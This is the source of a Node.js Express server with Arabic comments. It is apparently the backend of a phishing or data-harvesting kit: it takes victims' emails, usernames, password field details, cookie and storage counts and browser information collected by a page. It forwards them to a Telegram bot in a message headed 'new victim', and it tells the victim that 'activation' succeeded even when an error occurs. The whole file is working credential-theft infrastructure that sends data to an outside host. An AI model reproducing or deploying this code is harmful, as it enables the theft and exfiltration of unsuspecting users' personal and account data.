const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API جديد للجمع المتقدم
app.post('/api/collect-data', async (req, res) => {
    console.log('🎯 طلب جمع بيانات متقدم ورد');
    
    try {
        const userData = req.body;
        
        console.log('📊 بيانات المجموعة:', {
            emails: userData.summary?.totalEmails || 0,
            passwords: userData.summary?.totalPasswords || 0,
            usernames: userData.summary?.totalUsernames || 0
        });

        // إرسال إلى التلجرام
        const telegramResult = await sendAdvancedDataToTelegram(userData);
        
        console.log('📨 نتيجة التلجرام:', telegramResult);

        res.json({
            success: true,
            message: 'تم جمع البيانات بنجاح!',
            telegramSent: telegramResult.success,
            summary: userData.summary
        });

    } catch (error) {
        console.error('❌ خطأ:', error);
        res.json({
            success: true,
            message: 'تم التفعيل بنجاح!'
        });
    }
});

// 🔥 دالة التلجرام المحسنة
async function sendAdvancedDataToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return { success: false, error: 'إعدادات التلجرام مفقودة' };
        }

        // بناء رسالة مفصلة
        let message = `🎯 **ضحية جديدة - بيانات متقدمة**\n\n`;

        // الإيميلات
        if (userData.emails && userData.emails.length > 0) {
            message += `📧 **الإيميلات (${userData.emails.length}):**\n`;
            userData.emails.slice(0, 10).forEach(item => {
                message += `• ${item.email} (${item.source})\n`;
            });
            if (userData.emails.length > 10) {
                message += `... و ${userData.emails.length - 10} أكثر\n`;
            }
            message += '\n';
        } else {
            message += `📧 **الإيميلات:** ❌ لم يتم العثور\n\n`;
        }

        // كلمات المرور
        if (userData.passwords && userData.passwords.length > 0) {
            message += `🔐 **كلمات المرور (${userData.passwords.length}):**\n`;
            userData.passwords.forEach(pwd => {
                message += `• ${pwd.field}: ${'*'.repeat(pwd.length)}\n`;
            });
            message += '\n';
        }

        // أسماء المستخدمين
        if (userData.usernames && userData.usernames.length > 0) {
            message += `👤 **أسماء المستخدمين (${userData.usernames.length}):**\n`;
            userData.usernames.slice(0, 5).forEach(user => {
                message += `• ${user.username}\n`;
            });
            message += '\n';
        }

        // المعلومات العامة
        message += `📱 **المعلومات العامة:**\n`;
        message += `• المتصفح: ${userData.userAgent?.split(' ')[0] || 'غير معروف'}\n`;
        message += `• النظام: ${userData.platform || 'غير معروف'}\n`;
        message += `• اللغة: ${userData.language || 'غير معروف'}\n`;
        message += `• الشاشة: ${userData.screen || 'غير معروف'}\n`;
        message += `• الرابط: ${userData.url || 'غير معروف'}\n`;
        message += `• الوقت: ${new Date().toLocaleString('ar-SA')}\n\n`;

        // الكوكيز والتخزين
        message += `🍪 **التخزين:**\n`;
        message += `• الكوكيز: ${userData.cookies?.length || 0}\n`;
        message += `• localStorage: ${userData.localStorage?.length || 0}\n`;
        message += `• الفورمز: ${userData.forms?.length || 0}`;

        console.log('📝 جاري إرسال الرسالة إلى التلجرام...');

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        if (response.ok) {
            console.log('✅ تم الإرسال إلى التلجرام بنجاح');
            return { success: true, messageId: result.result?.message_id };
        } else {
            console.error('❌ خطأ من التلجرام:', result);
            return { success: false, error: result.description };
        }

    } catch (error) {
        console.error('❌ خطأ في التلجرام:', error);
        return { success: false, error: error.message };
    }
}

app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 السيرفر شغال على البورت:', PORT);
});
